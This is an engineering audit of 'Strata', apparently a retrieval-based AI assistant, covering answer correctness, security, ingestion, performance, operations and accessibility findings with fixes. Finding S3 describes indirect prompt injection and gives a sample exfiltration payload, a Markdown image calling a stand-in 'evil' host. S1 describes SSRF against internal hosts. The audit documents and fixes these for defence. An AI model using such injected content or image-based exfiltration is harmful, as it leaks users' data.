# Strata — System audit (2026-10-31)

A read-only audit of everything outside the HTTP API layer. The API layer was audited separately (40 findings, all high and most medium fixed): see [API_AUDIT.md](API_AUDIT.md). The prioritised plan built on these findings is in [ROADMAP.md](ROADMAP.md).

**Method.** Code review of `backend/app` (ingestion, connectors, retrieval, agent, graph, llm, worker, models), `backend/tests`, `web/src`, the Docker setup, and the docs. Every finding was checked against the code. Three were also reproduced:
- running the real chunker produced 10k- and 152k-character passages (C2);
- a search-result window was traced through a ~2.1k-character passage (C1);
- the website crawler was confirmed to have no private-address check and to follow redirects (S1).

Line numbers refer to the code as of 2026-10-31.

**Status:** 14 findings are fixed (see [Fixed since the audit](#fixed-since-the-audit)); the rest are open.

## Summary

| Area | High | Medium | Low |
|---|---|---|---|
| Answer correctness | 2 | 3 | 1 |
| Security (beyond the API) | 2 | 3 | 2 |
| Ingestion and connectors | 2 | 3 | 1 |
| Scalability and performance | 2 | 3 | 2 |
| Operations | 0 | 4 | 1 |
| Frontend UX and accessibility | 0 | 2 | 2 |
| **Total (35)** | **8** | **18** | **9** |

## Fixed since the audit

Each fix has a regression test; the full backend suite (186 tests) passes. The rows below keep the original evidence for reference.

| ID | What changed | Test |
|---|---|---|
| **S1**, S2 | One guarded fetcher for user- and model-chosen URLs (`app/core/safe_http.py`), used by the website crawler and the agent's page reader. Every hop, including robots.txt and each redirect, must resolve only to public addresses, and the request connects to the checked IP (Host header and TLS SNI keep the name, so certificates are still verified), which closes the DNS-rebinding window. Bodies are capped. The crawler's config form also rejects obvious internal hosts. | `tests/test_safe_http.py` |
| **S3** | Attachments are XML-escaped like other tool results, so a file can't close its block. The system prompt treats retrieved content as data. Images are removed from stored answers (`app/agent/sanitize.py`), never fetched by the web client (answers and document previews), and blocked by a CSP with `img-src 'self'` plus `X-Frame-Options`, `nosniff` and a referrer policy. | `tests/test_agent_nvidia.py`, `tests/test_sanitize.py` |
| **S5** | Every graph query skips mentions from hidden documents, for every viewer. | `tests/test_graph.py` |
| **C1** | Each search hit is shown complete, with the end of the previous passage and the start of the next as budget allows, and without repeating the chunker's overlap (`hit_window` in `app/retrieval/hybrid.py`). | `tests/test_hit_window.py` |
| **C2** | Passages are capped at 2,600 characters: oversized text splits by sentence, then line, then word, then characters, losing nothing. `make rechunk` (add `APPLY=1`) rebuilds documents indexed before the cap from their stored Markdown. | `tests/test_chunker.py`, `tests/test_rechunk.py` |
| **I1** | Connectors report items they couldn't fetch (`skip`) and listings that were cut short (`complete = False`). Skipped items are kept, partial listings prune nothing, and a sync where over 10% of items failed prunes nothing. GitHub reports truncated trees and its 1,000-file cap; Drive and the crawler report rate limits and server errors. | `tests/test_api_platform.py` |
| **O3**, **F1** | Stop calls `POST /orgs/{slug}/messages/{id}/cancel`, which cancels the run: generation and spend stop, and the partial answer is saved as `stopped`. Runs send a heartbeat (`messages.updated_at`, migration 0004); the worker marks answers whose heartbeat is over 90 s old as interrupted. Runs are capped at `CHAT_RUN_TIMEOUT_SECONDS` (default 900). | `tests/test_agent_nvidia.py` |
| O5 | With `COOKIE_SECURE=true` the API refuses the built-in or a short `SECRET_KEY`. Compose binds Postgres and the API to 127.0.0.1. `web/.dockerignore` excludes `.env*`. | `tests/test_ranking_units.py` |
| F2 | A polite live region announces each answer's progress (researching, writing, ready, stopped), and an alert region announces failures. | checked in the browser |
| **I2** | Running jobs send a heartbeat (`jobs.heartbeat_at`, migration 0005); only jobs whose heartbeat stopped for 3 minutes are re-queued, so a long sync is never run twice. Jobs for one source hold a Postgres advisory lock on a dedicated connection (released if the worker dies); a job that finds its source busy is deferred without spending an attempt. | `tests/test_worker_queue.py` |
| **P2** | No database connection is held while the model generates. The run loads in one short session, each tool call gets its own, and the answer is saved in another. The request's session is released before it waits on the answer. | `tests/test_agent_nvidia.py` (counts checked-out connections during generation) |
| **S4** | Connector secrets are encrypted at rest with Fernet (`app/core/crypto.py`, migration 0006 encrypts existing rows). Keys come from `SECRETS_ENCRYPTION_KEYS`, which can list several so keys can be rotated with `python -m app.core.crypto rotate`; without it, a key is derived from `SECRET_KEY`. A secret no key can decrypt reads as "not set" instead of breaking the sources page. | `tests/test_crypto.py` |

### Fix first
1. **S1:** SSRF in the website crawler. Anyone can sign up, create an org and crawl internal URLs.
2. **C1:** in search results, the model mostly sees the passage *before* each hit.
3. **I1:** transient fetch errors during a full sync delete documents, together with their boosts, votes and graph data.
4. **I2:** no job lease. Long syncs and graph extractions get re-queued and run twice at once.
5. **S3:** indirect prompt injection, plus zero-click data exfiltration through Markdown images.
6. **C2:** passage size is unbounded, so content past the embedder's limit can't be found.
7. **P2:** each chat run holds a database connection and an open transaction for its whole duration.
8. **S5:** hidden documents still reach the model through the knowledge graph.
9. **S4:** connector secrets are stored in plaintext.
10. **O3 / F1:** answers get stuck "streaming" after a restart, and Stop doesn't actually stop the run.

---

## 1. Answer correctness

| ID | Sev | Finding | Evidence | Suggested fix | Effort |
|---|---|---|---|---|---|
| C1 | **high** | `neighbour_text` joins the previous chunk, the hit and the next chunk, then the tool cuts the result to 2,400 characters. With real ~2.1k-character passages (350 words), the model gets the previous passage plus only ~300 characters of the hit. The evaluation corpus missed this because its passages are short (median 274 characters). | `app/agent/tools.py:287-294`, `app/retrieval/hybrid.py:306-321` | Build the window around the hit: the hit first and complete, then trailing context. Remove the duplicated 50-word overlap. Test with long passages. | S |
| C2 | **high** | Long paragraphs are only split on `.!?`, with no hard cap, so 10k words without punctuation become one passage. JSON is one fenced block, which made a 152k-character passage. The embedder truncates at ~512 tokens and the reranker sees 2,000 characters, so the rest can't be found. | `app/ingestion/chunker.py:60-74`, `app/ingestion/parsers.py:149-151`, `app/retrieval/hybrid.py:30,154` | Hard word cap. Split code, JSON and tables by lines. | S |
| C3 | med | Citations are never checked against source text. Unknown `[n]` markers are silently dropped, both in the UI and in what's saved, which hides unsupported claims. Graph tools hand out refs for documents the model never read, attached to LLM-written descriptions. | `web/src/components/chat/answer.tsx:52-53`, `app/agent/engine.py:777-781`, `app/agent/tools.py:339-352,385-391` | Flag unknown refs. Run a cheap overlap or entailment check of each claim against its cited passages. Label citations that come from the graph. | M |
| C4 | med | Citations are per document. The snippet and `chunk_id` come from the first hit, so the document sheet highlights the wrong passage when a later passage is the one that supports the claim. | `app/agent/citations.py:89-103`, `web/src/components/chat/document-sheet.tsx:47-59` | Track the passages shown for each ref and highlight the best match. | M |
| C5 | med | Parsers lose structure. PDFs get a `## Page N` section per page: real headings are lost, sections break at page boundaries, and there's no OCR, so scanned PDFs come back "empty" with no signal. DOCX tables are appended at the end of the document. CSV gets one passage per row, headed "Row n". | `app/ingestion/parsers.py:62-66,91-94,143-145`, `app/ingestion/pipeline.py:50-51` | Add OCR, or at least flag empty files. Keep tables in place. Batch CSV rows with their header (see Docling in [RESEARCH.md](RESEARCH.md)). | M |
| C6 | low | The prompt only says how to handle disagreement *between orgs*. There's no rule for superseded versions within one org, and the default recency weight is only 10%. | `app/agent/prompts.py:22`, `app/retrieval/hybrid.py:34`, `app/schemas/common.py:83` | Tell the model to prefer the newest effective date and say what was superseded. | S |

## 2. Security (beyond the API)

| ID | Sev | Finding | Evidence | Suggested fix | Effort |
|---|---|---|---|---|---|
| S1 | **high** | **SSRF in the website crawler.** No private-address check, redirects followed, robots.txt fetched. Any user can create an org (becoming its owner) and add a web source pointing at internal hosts: internal HTML gets indexed and becomes readable, and status codes leak through `ConnectorError`. `resp.text` has no size cap. | `app/connectors/web.py:78-115` (`follow_redirects=True` at line 79), `app/api/orgs.py:53-87`, `app/api/sources.py:98-118` | Reuse the guarded fetcher from `app/retrieval/web.py`: public-address check on every hop, manual redirects, streamed body with a byte cap. | S |
| S2 | low | DNS-rebinding window: the guarded fetcher resolves the host, then httpx resolves it again. | `app/retrieval/web.py:68-77,121-123` | Pin the connection to the vetted IP. | M |
| S3 | **high** | **Indirect prompt injection and zero-click exfiltration.** The system prompt never says that tool or attachment content is untrusted. Attachments go into the *user* turn unescaped (filename too), unlike search results. Graph descriptions are unescaped. Answers render Markdown images, there's no CSP, and `<img>` isn't overridden, so an injected `![](https://evil/?d=…)` sends data out when the answer renders. | `app/agent/prompts.py:3-23`, `app/agent/engine.py:421-432` (vs escaping in `tools.py:294`), `app/agent/tools.py:390`, `web/src/components/chat/answer.tsx:67`, `web/next.config.ts` | Add a "retrieved content is data, not instructions" rule. Escape attachments. Strip or proxy external images. Set CSP `img-src 'self'`. | S |
| S4 | med | `Source.secrets` is plaintext JSONB holding GitHub PATs, Slack and Notion tokens and Google service-account keys. Anyone with access to the database, a backup or a replica can read them. | `app/models/entities.py:135` | Envelope-encrypt (e.g. Fernet with a key from the environment or a KMS). | M |
| S5 | med | Graph queries never filter `documents.hidden`. Descriptions from hidden documents reach the model; only their refs are dropped. | `app/graph/query.py:44-55,118-129,147-158`; compare `app/retrieval/hybrid.py:275-283` | Join `documents` and add `NOT hidden`. | S |
| S6 | med | A member can overwrite any upload with the same name, and `_safe_name` maps different names to the same file. No per-org quota. Parsing has no time or memory limit (docx and PDF decompression bombs), and in the worker it runs on the event loop. | `app/api/sources.py:169-171,203-204`, `app/ingestion/pipeline.py:48`, `app/api/attachments.py:63` | Reject name collisions or use content-addressed names. Parse in a subprocess with resource limits. | M |
| S7 | low | Deleting an org or a collection leaves its uploaded files on disk; only deleting a source removes them. | `app/api/orgs.py:131-134`, `app/api/collections.py:93-97` vs `app/api/sources.py:151-152` | Remove the folders after the commit. | S |

**Checked and not findings:**
- XSS in rendered Markdown: react-markdown is used without rehype-raw, and React 19 blocks `javascript:` hrefs.
- Graph scope filtering by collection: filtered correctly.
- `read_document` re-checking scope and hidden: it does.
- Escaping `</source>`: the content is escaped.

## 3. Ingestion and connectors

| ID | Sev | Finding | Evidence | Suggested fix | Effort |
|---|---|---|---|---|---|
| I1 | **high** | A full sync prunes anything the connector didn't yield, and connectors skip items on error. The web crawler skips on HTTP errors. GitHub skips files on 403 (60 requests/hour without a token), ignores a `truncated` tree and caps at 1,000 files. Skipped documents are deleted, and the cascade takes their votes, boost, hidden flag and graph data. | `app/ingestion/pipeline.py:144-151`, `app/connectors/web.py:88-95`, `app/connectors/github.py:70-82` | Count failed or skipped ids as still present. Abort the prune when the error ratio is high. | S |
| I2 | **high** | `requeue_stale` re-queues any job running longer than 30 minutes, with no heartbeat, so long syncs and graph extractions run twice at once and double the LLM spend. `enqueue_sync` dedupes only *queued* jobs, not running ones. | `app/worker/queue.py:17-25,89-96`, `app/worker/__main__.py:54` | Heartbeat updated on progress, plus a per-source `pg_try_advisory_lock`. | M |
| I3 | med | Per-document failures and "empty" results are only logged, and sync stats aren't stored. The UI shows only `source.error`. | `app/ingestion/pipeline.py:138-140`, `app/worker/jobs.py:49`, `web/src/app/o/[org]/sources/[id]/page.tsx:159-161` | Store per-document status and sync stats, and show them. | M |
| I4 | med | Sync parsing blocks every job loop and the scheduler. Whole files are read into memory. A savepoint stays open across remote embedding calls. | `app/ingestion/pipeline.py:48,136-137`, `app/connectors/upload.py:39`, `app/connectors/web.py:98` | Move parsing to a thread or process pool. Embed before opening the transaction. | S |
| I5 | med | Nothing ever re-indexes. The raw-bytes hash short-circuits changes to the embedding model, chunker or parser. The vector dimension is fixed by the first migration, so a mismatch fails every document silently. | `app/ingestion/pipeline.py:41-46`, `alembic/versions/0001_initial_schema.py:252` | Store an index version per document. Add a re-index command. Check the dimension at startup. | M |
| I6 | low | Graph extraction is all-or-nothing per document: one model call per passage, and any failure re-runs the whole document. | `app/graph/extract.py` (`asyncio.gather` in `extract_document`) | Store results per passage. | M |

## 4. Scalability and performance

| ID | Sev | Finding | Evidence | Suggested fix | Effort |
|---|---|---|---|---|---|
| P1 | **high** | The keyword leg ORs every word and sorts *all* matches by `ts_rank_cd`. At 1M passages a common word matches most of the table, and this runs per query: up to 6 queries, so 12 SQL calls per search. Likely the first thing to break. | `app/retrieval/hybrid.py:115-127,175,185-210` | Try an AND/phrase query first and fall back to OR, or use a BM25 index (see pg_textsearch in [RESEARCH.md](RESEARCH.md)). | M |
| P2 | **high** | Each chat run holds one database session for its whole life. `SET LOCAL` and autobegin keep a transaction idle across LLM streaming. With a pool of 10+10, that's about 20 concurrent answers per process, and the open transactions block vacuum. | `app/agent/engine.py:290,806`, `app/retrieval/hybrid.py:181-182`, `app/core/db.py` | Short session per tool call; commit after each search. | M |
| P3 | med | N+1 queries in the graph tools. `list_entities` makes 300 rows × 2 queries ≈ 600 queries, registers up to 900 refs and returns 70k+ characters. `explore_entity` does 80 × 2. The count query recomputes the whole aggregate. | `app/agent/tools.py:384-386,439-440`, `app/retrieval/hybrid.py:274-284`, `app/graph/query.py:89-92` | Batch the lookups. Lower the limits and cap refs. | S |
| P4 | med | Reranking scores up to 6 × 40 pairs per search, and the local cross-encoder runs on API threads. Measured 528 ms on just 48 documents. | `app/retrieval/hybrid.py:153-160`, [EVALUATION.md](EVALUATION.md) | Rerank once against the primary query. Bound concurrency. | S |
| P5 | med | One global HNSW index (m=16, ef_construction=64) shared by every tenant. Selective tenant filters force long iterative scans. | `alembic/versions/0001_initial_schema.py:271-278`, `app/retrieval/hybrid.py:181-182` | Partition, or use partial indexes for large orgs. Set `hnsw.max_scan_tuples`. | M |
| P6 | low | Voyage embeddings: sequential batches, no retry on 429. | `app/embeddings/voyage_provider.py:22-34` | Backoff and parallel batches. | S |
| P7 | low | The UI re-parses the full Markdown answer on every update (O(n²) on long answers). The document sheet renders entire documents. | `web/src/lib/stream.ts:187-190`, `web/src/components/chat/answer.tsx:67`, `web/src/components/chat/document-sheet.tsx:111` | Throttle with requestAnimationFrame. Paginate the document sheet. | S |

## 5. Operations

| ID | Sev | Finding | Evidence | Suggested fix | Effort |
|---|---|---|---|---|---|
| O1 | med | `/health` doesn't check the database. The worker has no health check. There are no metrics or traces, and request ids aren't carried into worker logs. | `app/api/meta.py:16-29`, `docker-compose.yml` (worker) | Ready probe that pings the DB, a worker heartbeat, and metrics for job lag, latency and LLM errors (see Observability in [RESEARCH.md](RESEARCH.md)). | M |
| O2 | med | Every API container runs `alembic upgrade head` at start, so replicas race each other. | `backend/Dockerfile` (CMD) | Run migrations as a separate one-shot service. | S |
| O3 | med | Answer runs are in-process tasks. A restart leaves `status="streaming"` forever: nothing reaps it and the UI doesn't poll. | `app/api/chat.py:286,321` | Reap stale runs at startup. Poll while a message is streaming. | S |
| O4 | med | No backup story for the Postgres data or the uploaded-files volume. Upload syncs re-read files from disk, so the two must be backed up together. | `docker-compose.yml` | pg_dump or WAL-G plus volume snapshots. | S |
| O5 | low | Configuration footguns. `SECRET_KEY` has a working default and nothing refuses it. Postgres is published on 5432 with password `postgres`, and the API on 8000. `COOKIE_SECURE=false`. The rewrite target `BACKEND_URL` is baked in at build time. `web/.dockerignore` doesn't exclude `.env*`. | `app/core/config.py:17`, `docker-compose.yml`, `web/next.config.ts`, `web/.dockerignore` | Refuse the default secret outside dev. Don't publish the DB port. | S |

## 6. Frontend UX and accessibility

| ID | Sev | Finding | Evidence | Suggested fix | Effort |
|---|---|---|---|---|---|
| F1 | med | Stop only aborts the browser's request. The server keeps generating (and billing); the UI says "Stopped." and the full answer appears after a refresh. | `web/src/lib/stream.ts:65-67`, `app/api/chat.py:319-321`, `web/src/components/chat/messages.tsx:103` | Cancel endpoint that cancels the server task. | S |
| F2 | med | No `aria-live` region anywhere, so screen readers announce nothing during streaming, when the answer is ready, or on errors. | `web/src` (searched) | Add a polite live region. | S |
| F3 | low | The sources rail and its toggle only exist at ≥1280 px. | `web/src/app/o/[org]/chat/[id]/page.tsx:152,238` | Use a drawer below that width. | S |
| F4 | low | Insights shows a loading skeleton forever when the request fails. | `web/src/app/o/[org]/insights/page.tsx:42-46` | Add an error state. | S |

## 7. Test gaps

Nothing tests these:
- SSRF and redirect handling in the website crawler (only the guarded page fetcher is tested).
- The job queue: claim, retry and backoff, `requeue_stale`, two jobs running at once.
- The full-sync prune after a partial connector failure, or after GitHub tree truncation.
- A passage-size cap, or that a search result's window actually contains the hit (C1).
- PDF parsing (`test_parsers` has no PDF case), scanned or empty files, embedding-dimension mismatch.
- Hidden documents being excluded from the graph tools.
- Unknown or hallucinated citations, when saved or rendered.
- Prompt-injection regressions (an attachment containing `</attachment>`, Markdown images).
- Stop/cancel, and reaping of stuck "streaming" messages.
- Migrations up and down.
- Any frontend code: `web/package.json` has no test runner.
- Answer-level citation faithfulness: `eval/harness.py` computes `gold_cited` per document, but nothing checks that a cited passage supports the sentence.

## Related findings from the evaluation

These came out of measurement rather than code review; all are **fixed**. Details in [EVALUATION.md](EVALUATION.md).

- Nemotron wrote tool calls as plain text, which then showed up as the answer.
- After researching, the model sometimes returned an empty final turn.
- NVIDIA rate limits broke answers under load.
- Recency ranking had no effect on uploaded files.
- Answers didn't stream through the web proxy (gzip buffering).
- With tools offered but forbidden, Nemotron sometimes wrote nothing.
- Models sometimes sent a list argument as a bare string.
- A gateway-only configuration was treated as having a chat model.
- Name variants ("High Risk Tier" / "Risk Tier High") split knowledge-graph entities.
